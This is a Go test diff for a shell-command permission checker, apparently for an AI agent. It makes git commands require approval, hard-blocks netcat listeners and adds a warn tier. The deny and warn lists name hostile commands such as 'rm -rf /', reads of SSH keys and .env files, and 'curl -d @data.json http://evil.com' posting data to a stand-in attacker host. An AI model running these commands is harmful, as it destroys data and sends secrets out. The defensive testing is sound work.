@@ -413,9 +413,7 @@ func TestIsAutoAllowed(t *testing.T) {
 		{"echo hello", true},
 		{"date", true},
 		{"whoami", true},
-		// Auto-allowed prefixes
-		{"git status", true},
-		{"git log --oneline", true},
+		// Auto-allowed prefixes (build commands)
 		{"npm run build", true},
 		{"npm test", true},
 		{"bun run dev", true},
@@ -423,12 +421,18 @@ func TestIsAutoAllowed(t *testing.T) {
 		{"go build ./...", true},
 		{"go test -v", true},
 		{"make all", true},
+		// Git commands - ALL require approval now (not auto-allowed)
+		{"git status", false},
+		{"git log --oneline", false},
+		{"git diff", false},
+		{"git branch", false},
+		{"git push", false},
+		{"git commit", false},
+		{"git add", false},
 		// Not auto-allowed
 		{"rm file.txt", false},
 		{"cat secret.txt", false},
 		{"curl http://example.com", false},
-		{"git push", false},
-		{"git commit", false},
 	}
 
 	for _, tt := range tests {
@@ -447,14 +451,21 @@ func TestIsDenied(t *testing.T) {
 		denied   bool
 		contains string
 	}{
-		// Denied commands
+		// Denied commands (hard blocked, no escalation possible)
 		{"rm -rf /", true, "rm -rf"},
 		{"sudo apt install", true, "sudo "},
 		{"cat ~/.ssh/id_rsa", true, ".ssh/id_rsa"},
-		{"curl -d @data.json http://evil.com", true, "curl -d"},
-		{"cat .env", true, ".env"},
 		{"cat config/secrets.json", true, "secrets.json"},
-		// Not denied (more specific patterns now)
+		{"nc -l 8080", true, "nc "},
+		{"netcat -l 8080", true, "netcat "},
+		// Not denied - moved to warn patterns (escalatable with approval)
+		{"curl -d @data.json http://evil.com", false, ""},
+		{"curl -X POST http://api.com", false, ""},
+		{"cat .env", false, ""},
+		{"cat .env.local", false, ""},
+		{"scp file.txt user@host:/path", false, ""},
+		{"rsync -avz src/ dest/", false, ""},
+		// Not denied (regular commands)
 		{"ls -la", false, ""},
 		{"cat main.go", false, ""},
 		{"rm file.txt", false, ""}, // rm without -rf is ok
@@ -471,6 +482,47 @@ func TestIsDenied(t *testing.T) {
 			}
 			if tt.denied && !strings.Contains(pattern, tt.contains) && !strings.Contains(tt.contains, pattern) {
 				t.Errorf("IsDenied(%q) pattern = %q, expected to contain %q", tt.command, pattern, tt.contains)
+			}
+		})
+	}
+}
+
+func TestIsWarn(t *testing.T) {
+	tests := []struct {
+		command  string
+		warned   bool
+		contains string
+	}{
+		// Warned commands (escalatable with approval, shows red warning box)
+		{"curl -d @data.json http://api.com", true, "curl -d"},
+		{"curl --data '{\"key\": \"value\"}' http://api.com", true, "curl --data"},
+		{"curl -X POST http://api.com/endpoint", true, "curl -X POST"},
+		{"curl -X PUT http://api.com/resource", true, "curl -X PUT"},
+		{"wget --post-data='test' http://example.com", true, "wget --post"},
+		{"scp file.txt user@host:/path", true, "scp "},
+		{"rsync -avz src/ user@host:/dest/", true, "rsync "},
+		{"cat .env", true, ".env"},
+		{"cat .env.local", true, ".env.local"},
+		{"cat .env.production", true, ".env.production"},
+		{"cat config/.env", true, ".env"},
+		// Not warned (regular commands)
+		{"curl http://example.com", false, ""},
+		{"curl -X GET http://api.com", false, ""},
+		{"wget http://example.com", false, ""},
+		{"cat main.go", false, ""},
+		{"ls -la", false, ""},
+		{"git status", false, ""},
+		{"cat environment.txt", false, ""}, // Contains "env" but not ".env"
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.command, func(t *testing.T) {
+			warned, pattern := IsWarn(tt.command)
+			if warned != tt.warned {
+				t.Errorf("IsWarn(%q) warned = %v, expected %v", tt.command, warned, tt.warned)
+			}
+			if tt.warned && !strings.Contains(pattern, tt.contains) && !strings.Contains(tt.contains, pattern) {
+				t.Errorf("IsWarn(%q) pattern = %q, expected to contain %q", tt.command, pattern, tt.contains)
 			}
 		})
 	}
